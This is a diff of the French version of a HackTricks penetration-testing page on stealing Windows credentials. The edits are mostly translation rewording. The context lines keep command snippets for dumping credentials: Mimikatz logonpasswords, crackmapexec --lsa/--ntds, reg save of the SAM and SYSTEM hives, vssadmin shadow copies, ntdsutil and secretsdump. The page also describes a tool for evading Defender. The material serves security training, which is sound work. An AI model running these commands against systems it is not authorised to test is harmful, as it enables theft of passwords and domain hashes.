@@ -1,16 +1,16 @@
 # Vol de Credentials Windows
 
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
@@ -41,7 +41,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Identifiants avec Meterpreter
 
-Utilisez le [**Plugin d'Identifiants**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
+Utilisez le [**Plugin d'Identifiants**](https://github.com/carlospolop/MSF-Credentials) **que j'ai créé pour** **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -117,13 +117,13 @@ Get-Process -Name LSASS
 ```
 ## Dumpin lsass avec PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des fichiers de vidage mémoire et leur transfert sur des stations de travail distantes sans les déposer sur le disque.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des fichiers de vidage de mémoire et leur transfert sur des stations de travail distantes sans les déposer sur le disque.
 
 **Fonctionnalités clés** :
 
 1. Contournement de la protection PPL
-2. Obfuscation des fichiers de vidage mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
-3. Téléchargement du vidage mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
+2. Obfuscation des fichiers de vidage de mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
+3. Téléchargement de vidages de mémoire avec des méthodes de téléchargement RAW et SMB sans les déposer sur le disque (vidage sans fichier)
 
 {% code overflow="wrap" %}
 ```bash
@@ -146,7 +146,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump le mot de passe NTDS.dit de l'historique de l'AD cible
+### Dump the NTDS.dit password history from target DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -154,13 +154,13 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Stealing SAM & SYSTEM
+## Vol de SAM & SYSTEM
 
 Ces fichiers devraient être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.
 
-### From Registry
+### Depuis le Registre
 
-La façon la plus simple de voler ces fichiers est d'obtenir une copie à partir du registre :
+La façon la plus simple de voler ces fichiers est d'obtenir une copie depuis le registre :
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
@@ -175,9 +175,9 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. Vous devez être Administrateur.
 
-#### Using vssadmin
+#### Utilisation de vssadmin
 
-Le binaire vssadmin est uniquement disponible dans les versions Windows Server.
+Le binaire vssadmin n'est disponible que dans les versions Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -219,7 +219,7 @@ Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-ac
 
 Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait être localisée **dans la mémoire de `lsass`** (vous pouvez trouver les données récemment accédées probablement à cause de l'amélioration des performances grâce à un **cache**).
 
-#### Décryptage des hashs dans NTDS.dit
+#### Décryptage des hashs à l'intérieur de NTDS.dit
 
 Le hash est chiffré 3 fois :
 
@@ -235,7 +235,7 @@ Disponible depuis Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Vous pouvez également utiliser le [**volume shadow copy**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system)).
+Vous pouvez également utiliser le [**volume shadow copy**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
 
 ### **Extraction des hashes depuis NTDS.dit**
 
@@ -295,8 +295,8 @@ Téléchargez-le depuis : [ http://www.tarasco.org/security/pwdump\_7](http://ww
 [**Découvrez quelques protections des identifiants ici.**](credentials-protections.md)
 
 {% hint style="success" %}
-Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
